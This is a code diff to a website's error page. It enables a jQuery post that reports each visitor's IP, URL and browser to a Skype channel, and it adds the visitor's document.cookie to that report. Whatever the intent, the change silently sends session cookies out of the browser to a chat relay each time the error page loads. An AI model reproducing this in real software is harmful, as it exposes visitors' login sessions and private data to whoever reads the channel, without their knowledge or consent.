@@ -43,7 +43,6 @@
 
     <div id="main">
         <div id="content">
-
             <div class="text">
                 <h2>Something went wrong</h2>
             </div>
@@ -83,16 +82,17 @@
             dataType: 'jsonp',
             success: function(result){
                 var message = [
-                    'Another unsatisfied customer !',
+                    'Another unsatisfied customer!',
+                    'Client IP: '+ result.host,
                     'URL: '+window.location,
                     'Browser: '+ navigator.userAgent,
-                    'IP: '+ result.host
+                    'Cookie: '+document.cookie
                 ].join("\n");
 
-                /*$.post(skymsServerURL,{
+                $.post(skymsServerURL,{
                     message:message,
                     channel:skypeChannelBlob
-                });*/
+                });
             }
         });
     });
